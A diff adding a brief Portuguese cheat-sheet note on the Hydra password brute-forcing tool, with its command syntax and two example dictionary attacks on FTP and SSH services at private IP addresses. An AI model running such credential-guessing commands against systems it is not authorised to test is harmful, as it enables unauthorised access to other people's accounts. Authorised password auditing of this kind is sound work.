@@ -1,0 +1,14 @@
+############################HYDRA:##########################################
+
+hydra -L [arquivo com os usuarios] -P [arquivo com senhas] [ip alvo] [serviço]
+
+
+
+ex:
+
+hydra -L user.lst -P password.lst 10.0.0.10 ftp
+
+
+hydra -L usuario -P senha 10.21.0.121 ssh
+
+--
